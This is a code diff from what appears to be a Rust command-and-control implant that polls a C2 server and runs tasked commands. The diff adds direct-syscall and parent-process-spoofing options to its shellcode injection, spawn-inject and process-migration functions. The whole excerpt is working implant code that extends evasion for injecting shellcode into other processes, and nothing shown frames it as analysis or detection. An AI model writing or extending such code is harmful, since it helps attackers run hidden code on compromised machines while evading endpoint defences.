@@ -93,6 +93,8 @@ async fn dispatch_task<T: Transport>(
     cmd: &Command,
     token_state: &mut tasks::token::TokenState,
     spawn_process: &mut Option<String>,
+    use_syscalls: bool,
+    ppid_spoof: Option<&str>,
 ) -> anyhow::Result<(i32, String, String)> {
     match cmd.task_type {
         TaskType::Shell => run_command(cmd).await,
@@ -162,12 +164,12 @@ async fn dispatch_task<T: Transport>(
             let shellcode = base64::engine::general_purpose::STANDARD
                 .decode(&task.shellcode_b64)
                 .context("bad shellcode base64")?;
-            tasks::inject::inject(task.pid, &shellcode)
+            tasks::inject::inject(task.pid, &shellcode, use_syscalls)
         }
         TaskType::Shinject => {
             let task: ShinjectTask = serde_json::from_str(&cmd.command)
                 .context("bad ShinjectTask payload")?;
-            tasks::inject::shinject(task.pid, &task.shellcode_path)
+            tasks::inject::shinject(task.pid, &task.shellcode_path, use_syscalls)
         }
         TaskType::SpawnInject => {
             let task: SpawnInjectTask = serde_json::from_str(&cmd.command)
@@ -175,7 +177,7 @@ async fn dispatch_task<T: Transport>(
             let shellcode = base64::engine::general_purpose::STANDARD
                 .decode(&task.shellcode_b64)
                 .context("bad shellcode base64")?;
-            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process.as_deref())
+            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process.as_deref(), use_syscalls, ppid_spoof)
         }
         TaskType::Migrate => {
             let task: MigrateTask = serde_json::from_str(&cmd.command)
@@ -184,7 +186,7 @@ async fn dispatch_task<T: Transport>(
                 .decode(&task.shellcode_b64)
                 .context("bad shellcode base64")?;
             // migrate: inject into target, then ExitProcess (on Windows).
-            tasks::inject::migrate(task.pid, &shellcode)
+            tasks::inject::migrate(task.pid, &shellcode, use_syscalls)
         }
         TaskType::Spawn => {
             let task: SpawnTask = serde_json::from_str(&cmd.command)
@@ -192,7 +194,7 @@ async fn dispatch_task<T: Transport>(
             let shellcode = base64::engine::general_purpose::STANDARD
                 .decode(&task.shellcode_b64)
                 .context("bad shellcode base64")?;
-            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process.as_deref())
+            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process.as_deref(), use_syscalls, ppid_spoof)
         }
         TaskType::SetSpawnTo => {
             let task: SetSpawnToTask = serde_json::from_str(&cmd.command)
@@ -413,7 +415,7 @@ pub async fn run() -> anyhow::Result<()> {
         };
         debug_log!("[agent] poll: got cmd id={} type={:?}", cmd.cmd_id, cmd.task_type);
 
-        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd, &mut token_state, &mut spawn_process).await {
+        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd, &mut token_state, &mut spawn_process, cfg.use_syscalls, cfg.ppid_spoof.as_deref()).await {
             Ok(triple) => triple,
             Err(e) => {
                 debug_log!("[agent] task error: {e} -> send minimal result");
